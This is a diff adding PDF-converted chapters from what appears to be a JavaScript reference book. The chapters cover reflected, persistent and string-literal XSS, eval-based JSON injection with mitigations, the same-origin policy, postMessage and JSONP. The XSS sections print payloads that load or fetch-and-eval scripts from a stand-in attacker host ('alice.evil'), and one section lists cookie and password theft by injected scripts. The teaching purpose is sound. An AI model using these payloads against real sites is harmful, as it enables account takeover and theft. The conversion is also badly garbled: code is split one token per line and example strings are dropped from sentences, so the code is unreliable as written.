@@ -23288,5 +23288,643 @@ This example assumes that you have your RSA key pair generated in PEM.
 ![](./images/image045.png){width="7.486805555555556in"
 height="6.270138888888889in"}
 And now you&apos;re done! You can use your imported key in WebCrypto API.
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<h2 id="ch95">Chapter 95: Security issues</h2>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--
+This is a collection of common JavaScript security issues, like XSS
+and eval injection. This collection also contains how to mitigate
+these security issues.
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<h3 id="ch95-1">Section 95.1: Reflected Cross-site scripting (XSS)</h3>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--
+Let&apos;s say Joe owns a website that allows you to log on, view puppy
+videos, and save them to your account.
+https    :   // <i>example.com/search?q=brown+puppies</i>
+Whenever a user searches on that website, they are redirected to .
+If a user&apos;s search doesn&apos;t match anything, than they see a message
+along the lines of:
+Your search (<b>brown puppies</b>), didn&apos;t match anything. Try again.
+On the backend, that message is displayed like this:
+<b>if</b>
+(
+!
+searchResults
+)
+{
+webPage
++=
+&quot;&lt;div&gt;Your search (&lt;b&gt;&quot;
+&plus;
+searchQuery
+&plus;
+&quot;&lt;/b&gt;), didn&apos;t match anything. Try again.&quot;
+;
+}
+<b>&lt;h1&gt;</b>   headings<b>&lt;/h1</b>
+However, when Alice searches for <b>&gt;</b>, she gets this back:
+Your search (<b>headings</b>
+) didn&apos;t match anything. Try again.
+Raw HTML:
+Your search (&lt;b&gt;&lt;h1&gt;headings&lt;/h1&gt;&lt;/b&gt;) didn&apos;t match anything.
+Try again.
+<b>&lt;script</b>     <b>&gt;</b>   alert(1)<b>&lt;/script</b>
+Than Alice searches for <b>&gt;</b>, she sees:
+Your search (), didn&apos;t match anything. Try again.
+And:
+![](./images/image046.png){width="4.585416666666666in"
+height="1.4868055555555555in"}
+<b>&lt;script</b> src = &quot;https://alice.evil/puppy_xss.js&gt;&lt;/script&gt;really
+cute puppies
+Than Alice searches for , and copies the link in her address bar, and
+then emails Bob:
+Bob,
+When I search for [cute
+puppies](https://example.com/search?q=%3Cscript+src+=+%22https://alice.evil/puppy_xss.js%3E%3C/script%3Ereally+cute+puppies),
+nothing happens!
+Than Alice successfully gets Bob to run her script while Bob is logged
+on to his account.
+<b>Mitigation:</b>
+1.  Escape all angle brackets in searches before returning the search
+    term when no results are found.
+2.  Don&apos;t return the search term when no results are found.
+3.  <b>Add a [Content Security
+    Policy](https://stackoverflow.com/q/30280370/6560716) that refuses
+    to load active content from other domains</b>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<h3 id="ch95-2">Section 95.2: Persistent Cross-site scripting (XSS)</h3>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--
+Let&apos;s say that Bob owns a social website that allows users to
+personalize their profiles.
+Alice goes to Bob&apos;s website, creates an account, and goes to her
+profile settings. She sets her profile description to I&apos;m actually
+too lazy to write something here.
+When her friends view her profile, this code gets run on the server:
+<b>if</b>
+(
+viewedPerson.
+profile
+.
+description
+)
+{
+page
++=
+&quot;&lt;div&gt;&quot;
+&plus;
+viewedPerson.
+profile
+.
+description
+&plus;
+&quot;&lt;/div&gt;&quot;
+;
+}
+<b>else</b>
+{
+page
++=
+&quot;&lt;div&gt;This person doesn&apos;t have a profile description.&lt;/div&gt;&quot;
+;
+}
+Resulting in this HTML:
+<b>&lt;</b>
+<b>div</b>
+<b>&gt;</b>
+I&apos;m actually too lazy to write something here.
+<b>&lt;</b>
+<b>/div</b>
+<b>&gt;</b>
+<b>&lt;b</b>   <b>&gt;</b>   I like HTML<b>&lt;/b></b>
+Than Alice sets her profile description to <b>&gt;</b>. When she visits her
+profile, instead of seeing
+&lt;b&gt;I like HTML&lt;/b&gt;
+she sees
+<b>I like HTML</b>
+Then Alice sets her profile to
+<b>&lt;</b>
+<b>script</b>
+src =
+&quot;https://alice.evil/profile_xss.js&quot;
+<b>&gt;</b>
+<b>&lt;</b>
+<b>/script</b>
+<b>&gt;</b>
+I
+&apos;m actually too lazy to write something
+here.
+Whenever someone visits her profile, they get Alice&apos;s script run on
+Bob&apos;s website while logged on as their account.
+<b>Mitigation</b>
+1.  Escape angle brackets in profile descriptions, etc.
 
+2.  Store profile descriptions in a plain text file that is then fetched
+    with a script that adds the description via
+.innerText
+3.  <b>Add a [Content Security
+    Policy](https://stackoverflow.com/q/30280370/6560716) that refuses
+    to load active content from other domains</b>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<h3 id="ch95-3">Section 95.3: Persistent Cross-site scripting from JavaScript string literals</h3>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--
+Let&apos;s say that Bob owns a site that lets you post public messages.
+The messages are loaded by a script that looks like this:
+addMessage
+(
+&quot;Message 1&quot;
+)
+;
+addMessage
+(
+&quot;Message 2&quot;
+)
+;
+addMessage
+(
+&quot;Message 3&quot;
+)
+;
+addMessage
+(
+&quot;Message 4&quot;
+)
+;
+addMessage
+(
+&quot;Message 5&quot;
+)
+;
+addMessage
+(
+&quot;Message 6&quot;
+)
+;
+The addMessage function adds a posted message to the DOM. However, in
+an effort to avoid XSS, <b>any HTML in messages posted is escaped.</b>
+The script is generated <b>on the server</b> like this:
+<b>for</b>
+(
+<b>var</b>
+i
+=
+0
+;
+i
+&lt;
+messages.
+length
+;
+i
+++
+)
+{
+script
++=
+&quot;addMessage(
+<b>&bsol;&amp;quot;</b>
+&quot;
+&plus;
+messages
+&lbrack;
+i
+&rbrack;
+&plus;
+&quot;
+<b>&bsol;&amp;quot;</b>
+)
+;&quot;
+;
+}
+My mom said :   &quot;Life is good. Pie makes it better. &quot;
+So alice posts a message that says: . Than when she previews the
+message, instead of seeing her message she sees an error in the
+console:
+Uncaught SyntaxError
+:
+missing
+)
+after argument list
+Why? Because the generated script looks like this:
+addMessage
+(
+&quot;My mom said: &quot;
+Life is good.
+Pie
+makes it better.
+&quot;&quot;
+)
+;
+That&apos;s a syntax error. Than Alice posts:
+I like pie
+&quot;);fetch(&quot;https:// <i>alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);//</i>
+Then the generated script looks like: addMessage(&quot;I like pie
+&quot;);fetch(&quot;https://alice.evil/js_xss.js&quot;).then(x=&gt;x.text()).then(eval);// <i>&quot;);</i>
+<b>https</b>    <b>:</b>   <b><i>// alice.evil/js_xss.js</i></b>
+That adds the message I like pie, but it also <b>downloads and runs
+whenever someone visits Bob&apos;s site.</b>
+<b>Mitigation:</b>
+1.  Pass the message posted into JSON.stringify()
+2.  Instead of dynamically building a script, build a plain text file
+    containing all the messages that is later fetched by the script
+3.  <b>Add a [Content Security
+    Policy](https://stackoverflow.com/q/30280370/6560716) that refuses
+    to load active content from other domains</b>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<h3 id="ch95-4">Section 95.4: Why scripts from other people can harm your website and its visitors</h3>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--
+If you don&apos;t think that malicious scripts can harm your site, <b>you
+are wrong</b>. Here is a list of what a malicious script could do:
+1.  Remove itself from the DOM so that <b>it can&apos;t be traced</b>
+2.  Steal users&apos; session cookies and <b>enable the script author to log
+    in as and impersonate them</b>
+3.  Show a fake &quot;Your session has expired. Please log in again.&quot;
+    message that <b>sends the user&apos;s password to the script author</b>.
+4.  Register a malicious service worker that runs a malicious script
+    <b>on every page visit</b> to that website.
+5.  Put up a fake paywall demanding that users <b>pay money</b> to access
+    the site <b>that actually goes to the script author</b>.
+Please, <b>don&apos;t think that XSS won&apos;t harm your website and its
+visitors.</b>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<h3 id="ch95-5">Section 95.5: Evaled JSON injection</h3>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--
+Let&apos;s say that whenever someone visits a profile page in Bob&apos;s
+website, the following URL is fetched:
+https
+:
+// <i>example.com/api/users/1234/profiledata.json</i>
+With a response like this:
+{
+&quot;name&quot;
+:
+&quot;Bob&quot;
+,
+&quot;description&quot;
+:
+&quot;Likes pie & security holes.&quot;
+}
+Than that data is parsed & inserted:
+<b>var</b> data = eval(&quot;(&quot; + resp + &quot;)&quot;);
+document.getElementById(&quot;#name&quot;).innerText = data.name;
+document.getElementById(&quot;#description&quot;).innerText =
+data.description;
+Seems good, right? <b>Wrong.</b>
+Likes XSS.&quot;});alert(1);({&quot;name&quot;:&quot;Alice&quot;,&quot;description&quot;:&quot;Likes
+XSS.
+What if someone&apos;s description is ?
+Seems weird, but if poorly done, the response will be:
+{
+&quot;name&quot;
+:
+&quot;Alice&quot;
+,
+&quot;description&quot;
+:
+&quot;Likes pie & security holes.&quot;
+}
+)
+;
+alert
+(
+1
+)
+;
+(
+{
+&quot;name&quot;
+:
+&quot;Alice&quot;
+,
+&quot;description&quot;
+:
+&quot;Likes
+XSS.&quot;
+}
+And this will be
+eval
+ed:
+(
+{
+&quot;name&quot;
+:
+&quot;Alice&quot;
+,
+&quot;description&quot;
+:
+&quot;Likes pie & security holes.&quot;
+}
+)
+;
+alert
+(
+1
+)
+;
+(
+{
+&quot;name&quot;
+:
+&quot;Alice&quot;
+,
+&quot;description&quot;
+:
+&quot;Likes
+XSS.&quot;
+}
+)
+If you don&apos;t think that&apos;s a problem, paste that in your console and
+see what happens.
+<b>Mitigation</b>
+<b>Use JSON.parse instead of eval to get JSON.</b> In general, don&apos;t use
+eval, and definitely don&apos;t use eval with something a user could
+control. Eval [creates a new execution
+context](http://dmitrysoshnikov.com/ecmascript/chapter-1-execution-contexts/),
+creating a <b>performance hit</b>.
+Properly escape
+&quot;
+and
+&bsol;&bsol;
+in user data before putting it in JSON. If you just escape the
+&quot;
+, than this will happen:
+Hello
+!
+&bsol;&bsol;
+&quot;});alert(1);({
+Will be converted to:
+&quot;Hello!
+<b>&bsol;&bsol;&amp;ast;</i>
+&quot;
+}
+)
+;
+alert
+(
+1
+)
+;
+(
+{
+&quot;
+Oops. Remember to escape both the &bsol;&bsol; and &quot;, or just use JSON.parse.
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<h2 id="ch96">Chapter 96: Same Origin Policy & CrossOrigin Communication</h2>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--
+Same-Origin policy is used by web browsers to prevent scripts to be
+able to access remote content if the remote address has not the same
+<b>origin</b> of the script. This prevents malicious scripts from
+performing requests to other websites to obtain sensitive data.
+The <b>origin</b> of two addresses is considered the same if both URLs
+have the same <i>protocol</i>, <i>hostname</i> and <i>port</i>.
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<h3 id="ch96-1">Section 96.1: Safe cross-origin communication with messages</h3>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--
+window.postMessage()   method together with its relative  window.onmessage
+event handler      
+The can be safely used to enable cross-origin communication.
+postMessage()
+postMessage()
+The method of the target window can be called to send a message to
+another window, which will be able to intercept it with its onmessage
+event handler, elaborate it, and, if necessary, send a response back
+to the sender window using again.
+
+<b>Example of Window communicating with a children frame</b>
+Content of
+http
+:
+// <i>main-site.com/index.html</i>
+:
+<i>&lt;!&bsol; &hellip; &amp;gt;</i>
+<b>&lt;</b>
+<b>iframe</b>
+id
+=
+&quot;frame-id&quot;
+src
+=
+&quot;http://other-site.com/index.html&quot;
+<b>&gt;</b>
+<b>&lt;</b>
+<b>/iframe</b>
+<b>&gt;</b>
+<b>&lt;</b>
+<b>script</b>
+src
+=
+&quot;main_site_script.js&quot;
+<b>&gt;</b>
+<b>/script</b>
+<b>&lt;</b>
+<b>&gt;</b>
+<i>&lt;!&bsol; &hellip; &amp;gt;</i>
+Content of
+http
+:
+// <i>other-site.com/index.html</i>
+:
+<i>&lt;!&bsol; &hellip; &amp;gt;</i>
+<b>&lt;</b>
+<b>script</b>
+src
+=
+&quot;other_site_script.js&quot;
+<b>&gt;</b>
+<b>&lt;</b>
+<b>/src</b>
+<b>&gt;</b>
+<i>&lt;!&bsol; &hellip; &amp;gt;</i>
+Content of
+main_site_script.
+js
+:
+// <i>Get the &lt;iframe&gt;&apos;s window</i>
+<b>var</b>
+frameWindow
+=
+document.
+getElementById
+(
+&apos;frame-id&apos;
+)
+.
+contentWindow
+;
+// <i>Add a listener for a response</i>
+
+window.
+addEventListener
+(
+&apos;message&apos;
+,
+<b>function</b>
+(
+evt
+)
+{
+// <i>IMPORTANT: Check the origin of the data!</i>
+<b>if</b>
+(
+event.
+origin
+.
+indexOf
+(
+&apos;http://other-site.com&apos;
+)
+==
+0
+)
+{
+// <i>Check the response</i>
+console.
+log
+(
+evt.
+data
+)
+;
+<i>/&ast; &hellip; &ast;/</i>
+}
+}
+)
+;
+// <i>Send a message to the frame&apos;s window</i>
+frameWindow.
+postMessage
+(
+<i>/&ast; any obj or var &ast;/</i>
+,
+&apos;&ast;&apos;
+)
+;
+Content of
+other_site_script.
+js
+:
+window.
+addEventListener
+(
+&apos;message&apos;
+,
+<b>function</b>
+(
+evt
+)
+{
+// <i>IMPORTANT: Check the origin of the data!</i>
+<b>if</b>
+(
+event.
+origin
+.
+indexOf
+(
+&apos;http://main-site.com&apos;
+)
+==
+0
+)
+{
+// <i>Read and elaborate the received data</i>
+console.
+log
+(
+evt.
+data
+)
+;
+<i>/&ast; &hellip; &ast;/</i>
+// <i>Send a response back to the main window</i>
+window.
+parent
+.
+postMessage
+(
+<i>/&ast; any obj or var &ast;/</i>
+,
+&apos;&ast;&apos;
+)
+;
+}
+}
+)
+;
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<h3 id="ch96-2">Section 96.2: Ways to circumvent Same-Origin Policy</h3>
+<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
+<!--
+As far as client-side JavaScript engines are concerned (those running
+inside a browser), there is no straightforward solution available for
+requesting content from sources other than the current domain. (By the
+way, this limitation does not exist in JavaScript-server tools such as
+Node JS.)
+However, it is (in some situations) indeed possible to retrieve data
+from other sources using the following methods. Please do note that
+some of them may present hacks or workarounds instead of solutions
+production system should rely on.
+<b>Method 1: CORS</b>
+Access
+Most public APIs today allow developers to send data bidirectionally
+between client and server by enabling a feature called CORS
+(Cross-Origin Resource Sharing). The browser will check if a certain
+HTTP header (-
+Control      &minus;   Allow     &minus;   Origin
+) is set and that the requesting site&apos;s domain is listed in the
+header&apos;s value. If it is, then the
+browser will allow establishing AJAX connections.
+However, because developers cannot change other servers&apos; response
+headers, this method can&apos;t always be relied on.
+<b>Method 2: JSONP</b>
+<b>JSON</b> with <b>P</b>adding is commonly blamed to be a workaround. It is
+not the most straightforward method, but it still gets the job done.
+This method takes advantage of the fact that script files can be
+loaded from any domain. Still, it is crucial to mention that
+requesting JavaScript code from external sources is <b>always</b> a
+potential security risk and this should generally be avoided if
+there&apos;s a better solution available.
+The data requested using JSONP is typically JSON, which happens to fit
+the syntax used for object definition in JavaScript, making this
+method of transport very simple. A common way to let websites use the
+external data obtained via JSONP is to wrap it inside a callback
+function, which is set via a GET parameter in the URL. Once the
+external script file loads, the function will be called with the data
+as its first parameter.
+<b>&lt;</b>
+<b>script</b>
+<b>&gt;</b>
+function myfunc(obj){
+console.log(obj.example_field);
+}
+<b>&lt;</b>
+<b>/script</b>
+<b>&gt;</b>
+<b>&lt;</b>
+<b>script</b>
+src
+=
+&quot;http://example.com/api/endpoint.js?callback=myfunc&quot;
+<b>&gt;</b>
+<b>&lt;</b>
+<b>/script</b>
+<b>&gt;</b>
+http   :   // <i>example.com/api/endpoint.js?callback=myfunc</i>
+The contents of might look like this:
+myfunc
+(
+{
+&quot;example_field&quot;
+:
+<b>true</b>
+}
+)
+The function always has to be defined first, otherwise it won&apos;t be
+defined when the external script loads.
 
